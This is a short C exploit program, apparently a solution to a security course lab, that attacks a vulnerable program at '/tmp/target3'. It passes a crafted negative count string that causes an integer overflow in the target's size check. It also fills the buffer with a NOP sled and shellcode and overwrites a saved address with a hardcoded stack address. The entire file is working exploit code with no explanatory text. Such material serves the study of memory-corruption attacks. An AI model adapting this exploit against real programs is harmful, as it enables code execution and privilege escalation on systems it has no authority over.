#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

struct widget_t {
  double x;
  double y;
  int count;
};
static char payload[1001 * sizeof(struct widget_t) + 12]; // 12 == strlen(count)

int main(void)
{
  char *args[3];
  char *env[1];
  char *count = "-2147482647,";

  strncpy(payload, count, strlen(count));
  memset(payload + strlen(count), 0x90, sizeof(payload) - strlen(count));
  memcpy(payload + sizeof(payload) - sizeof(struct widget_t) - sizeof(shellcode), shellcode, sizeof(shellcode));
  *(int *)(payload + sizeof(payload) - sizeof(struct widget_t) + 4) = 0xbfff61f8;

  args[0] = TARGET; args[1] = payload; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
